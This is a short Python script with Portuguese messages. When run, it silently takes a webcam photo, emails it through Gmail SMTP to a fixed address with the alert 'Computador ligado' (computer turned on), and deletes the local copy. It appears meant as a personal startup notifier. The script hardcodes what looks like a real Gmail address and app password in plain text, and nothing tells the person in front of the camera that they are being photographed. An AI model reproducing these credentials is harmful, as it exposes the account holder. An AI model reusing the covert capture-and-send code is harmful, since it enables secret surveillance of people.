from email.mime.nonmultipart import MIMENonMultipart
import os
import smtplib
import datetime as dt

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

EMAIL_ADDRESS = 'gustavo.carvalhoads@gmail.com'
EMAIL_PASSWORD = 'lynubwzxfdlpiwww'

import cv2
import requests

def savingPicWithoutConnection(name= None):
    if(name != None):
        os.chdir("C:\\Users\\" + os.getlogin() + "\\AppData\\Local\\Temp")
        

def verifyingConnection():
    try:
        if(requests.get(url= "https://google.com.br", timeout=1) is not None):
            sendEmail()
    except Exception as e:
        savingPicWithoutConnection(takingPicture())
        exit()

def takingPicture():
    cam = cv2.VideoCapture(0)
    ret, frame = cam.read()

    img_name = f"cvSS{dt.datetime.now().strftime('%d_%m_%y___%H_%M')}.png"
    cv2.imwrite(img_name, frame)
    return img_name

def sendEmail():
    with smtplib.SMTP('smtp.gmail.com', 587) as smtp:
        smtp.ehlo()
        smtp.starttls()
        
        smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)

        if smtp is not None:
            file = takingPicture()

            subject = "Computador ligado"
            body = f"Seu computador foi ligado às {dt.datetime.now().strftime('%d/%m/%y %H:%M')}"

            msg = MIMEMultipart()
            msg['from'] = EMAIL_ADDRESS
            msg['to'] = 'kafetaum69@gmail.com'
            msg['subject'] = subject

            img = os.getcwd() + "\\" + file
            
            img_opened = open(img, 'rb')

            attachment = MIMEBase('application', 'octet-stream')
            attachment.set_payload(img_opened.read())
            encoders.encode_base64(attachment)

            attachment.add_header('Content-Disposition', f'attachment; filename={file}')
            img_opened.close()

            msg.attach(attachment)


            try:
                os.remove(img)
                msg.attach(MIMEText(body+"\n\nIMG removida com sucesso", 'plain'))
            except FileNotFoundError:
                msg.attach(MIMEText(body+"\n\nFalha na remoção da IMG", 'plain'))
            finally:
                smtp.sendmail(msg['from'], msg['to'], msg.as_string())

verifyingConnection()







